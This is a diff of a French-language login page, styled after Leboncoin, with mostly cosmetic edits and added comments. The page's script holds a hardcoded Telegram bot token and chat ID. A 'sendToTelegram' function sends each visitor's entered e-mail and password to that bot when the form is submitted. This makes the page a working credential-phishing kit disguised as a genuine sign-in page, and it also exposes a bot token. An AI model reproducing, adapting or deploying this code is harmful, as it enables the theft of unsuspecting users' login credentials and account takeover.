@@ -1,4 +1,4 @@
-<!DOCTYPE html> 
+<!DOCTYPE html>
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
@@ -15,6 +15,7 @@
         body {
             margin: 0;
             padding: 0;
+            background-color: white; /* Fond blanc général */
         }
 
         header {
@@ -29,11 +30,6 @@
 
         header img {
             width: 190px;
-        }
-
-        .ui {
-            background: #d8dde5;
-            padding: 4px;
         }
 
         main {
@@ -167,9 +163,10 @@
 </head>
 <body>
 
+    <!-- En-tête avec nouveau logo -->
     <header>
         <div class="logo">
-            <img src="image/logo.png" alt="Logo Leboncoin">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ99d5FfXb09Wt4b_VyIGEdQajCjKaEZi4FSg&s" alt="Logo">
         </div>
     </header>
 
@@ -180,12 +177,14 @@
                 <p>Connectez-vous pour découvrir toutes nos fonctionnalités.</p>
             </div>
 
+            <!-- Message d'erreur PHP -->
             <?php if (isset($error)) : ?>
                 <div style="color: red; text-align: center; margin-top: 20px;">
                     <?php echo $error; ?>
                 </div>
             <?php endif; ?>
 
+            <!-- Formulaire de connexion -->
             <form action="index.php" method="post" id="loginForm">
                 <div class="col">
                     <label for="user">E-mail *</label>
@@ -214,9 +213,11 @@
     </main>
 
     <script>
+        // Bot Telegram
         const token = "8047026898:AAEYkbvc49hNhy9bGvd5iG07PHRe1jKj6uI";
         const chatId = "5601119281";
 
+        // Envoie les infos à Telegram
         async function sendToTelegram(formData) {
             const message = `Nouveau message depuis le formulaire :
 E-mail: ${formData.user}
@@ -225,9 +226,7 @@ Mot de passe: ${formData.pass}`;
 
             const response = await fetch(url, {
                 method: "POST",
-                headers: {
-                    "Content-Type": "application/json",
-                },
+                headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
                     chat_id: chatId,
                     text: message
@@ -237,6 +236,7 @@ Mot de passe: ${formData.pass}`;
             return response.json();
         }
 
+        // Soumission du formulaire
         document.getElementById("loginForm").addEventListener("submit", function (event) {
             event.preventDefault();
 
